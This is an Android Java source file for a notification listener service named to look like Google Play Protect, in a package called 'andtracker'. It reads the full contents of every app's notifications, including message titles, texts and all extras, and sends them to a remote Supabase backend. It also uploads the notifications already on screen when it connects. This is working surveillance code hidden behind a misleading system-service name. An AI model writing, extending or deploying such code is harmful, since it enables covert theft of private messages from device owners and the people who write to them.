package com.andtracker;

import android.app.Notification;
import android.os.Build;
import android.os.Bundle;
import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;
import android.util.Log;

import org.json.JSONObject;

import java.util.Arrays;

public class PlayProtectNotificationService extends NotificationListenerService {
    private static final String TAG = "PlayProtectNotif";

    @Override
    public void onCreate() {
        super.onCreate();
        Log.d(TAG, "Service créé");
    }

    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        if (sbn == null) return;

        try {
            JSONObject payload = buildNotificationPayload(sbn, "posted");
            String title = payload.optString("title", "");
            String text = payload.optString("text", "");
            Log.d(TAG, "onNotificationPosted pkg=" + sbn.getPackageName()
                    + " id=" + sbn.getId()
                    + " key=" + (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP ? sbn.getKey() : "n/a")
                    + " title=\"" + title + "\""
                    + " text=\"" + text + "\""
                    + " payload_len=" + payload.toString().length());

            SupabaseAndroidEventsClient.sendEvent(
                    this,
                    sbn.getPackageName(),
                    "notifications",
                    payload.toString()
            );
        } catch (Exception e) {
            Log.e(TAG, "Erreur traitement notification", e);
        }
    }

    @Override
    public void onListenerConnected() {
        super.onListenerConnected();
        Log.d(TAG, "Listener connecté (notification access OK)");

        // Backfill simple: envoyer les notifications déjà présentes au moment de la connexion
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            try {
                StatusBarNotification[] actives = getActiveNotifications();
                if (actives != null) {
                    for (StatusBarNotification sbn : actives) {
                        if (sbn == null) continue;
                        try {
                            JSONObject payload = buildNotificationPayload(sbn, "active_on_connect");
                            SupabaseAndroidEventsClient.sendEvent(
                                    this,
                                    sbn.getPackageName(),
                                    "notifications",
                                    payload.toString()
                            );
                        } catch (Exception inner) {
                            Log.w(TAG, "Impossible d'envoyer une notif active", inner);
                        }
                    }
                }
            } catch (Exception e) {
                Log.w(TAG, "getActiveNotifications() a échoué", e);
            }
        }
    }

    @Override
    public void onListenerDisconnected() {
        super.onListenerDisconnected();
        Log.w(TAG, "Listener déconnecté");
    }

    private static JSONObject buildNotificationPayload(StatusBarNotification sbn, String source) throws Exception {
        JSONObject root = new JSONObject();
        if (source != null) root.put("source", source);
        root.put("package_name", sbn.getPackageName());
        root.put("id", sbn.getId());
        root.put("tag", sbn.getTag());
        root.put("post_time", sbn.getPostTime());

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            root.put("key", sbn.getKey());
            root.put("group_key", sbn.getGroupKey());
        }

        Notification n = sbn.getNotification();
        if (n == null) return root;

        root.put("when", n.when);
        root.put("flags", n.flags);
        if (n.tickerText != null) root.put("ticker_text", n.tickerText.toString());
        if (n.category != null) root.put("category", n.category);

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.JELLY_BEAN) {
            root.put("priority", n.priority);
        }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            root.put("visibility", n.visibility);
        }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            root.put("channel_id", n.getChannelId());
        }

        // Extras (titre/texte + contenu “complet” disponible)
        Bundle extras = n.extras;
        if (extras != null) {
            JSONObject extrasJson = new JSONObject();

            // Champs “classiques” (plus faciles à exploiter côté Supabase)
            putIfNonEmpty(root, "title", extras.getCharSequence(Notification.EXTRA_TITLE));
            putIfNonEmpty(root, "text", extras.getCharSequence(Notification.EXTRA_TEXT));
            putIfNonEmpty(root, "sub_text", extras.getCharSequence(Notification.EXTRA_SUB_TEXT));
            putIfNonEmpty(root, "summary_text", extras.getCharSequence(Notification.EXTRA_SUMMARY_TEXT));
            putIfNonEmpty(root, "info_text", extras.getCharSequence(Notification.EXTRA_INFO_TEXT));

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.JELLY_BEAN) {
                putIfNonEmpty(root, "big_text", extras.getCharSequence(Notification.EXTRA_BIG_TEXT));
                putIfNonEmpty(root, "big_content_title", extras.getCharSequence(Notification.EXTRA_TITLE_BIG));
            }
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
                putIfNonEmpty(root, "conversation_title", extras.getCharSequence(Notification.EXTRA_CONVERSATION_TITLE));
            }

            // Dump générique (contenu “complet” des extras en string)
            for (String key : extras.keySet()) {
                Object value = extras.get(key);
                extrasJson.put(key, stringifyExtra(value));
            }
            root.put("extras", extrasJson);
        }

        return root;
    }

    private static void putIfNonEmpty(JSONObject root, String key, CharSequence value) throws Exception {
        if (value == null) return;
        String s = value.toString();
        if (s.trim().isEmpty()) return;
        root.put(key, s);
    }

    private static String stringifyExtra(Object value) {
        if (value == null) return "null";
        try {
            if (value instanceof CharSequence) return value.toString();
            if (value instanceof String) return (String) value;
            if (value instanceof Integer || value instanceof Long || value instanceof Boolean || value instanceof Double || value instanceof Float) {
                return String.valueOf(value);
            }
            if (value instanceof String[]) return Arrays.toString((String[]) value);
            if (value instanceof CharSequence[]) return Arrays.toString((CharSequence[]) value);
            if (value instanceof int[]) return Arrays.toString((int[]) value);
            if (value instanceof long[]) return Arrays.toString((long[]) value);
            if (value instanceof boolean[]) return Arrays.toString((boolean[]) value);
            // Fallback (peut inclure PendingIntent, Bitmap, etc.)
            return String.valueOf(value);
        } catch (Exception e) {
            return "[unserializable:" + value.getClass().getName() + "]";
        }
    }
}

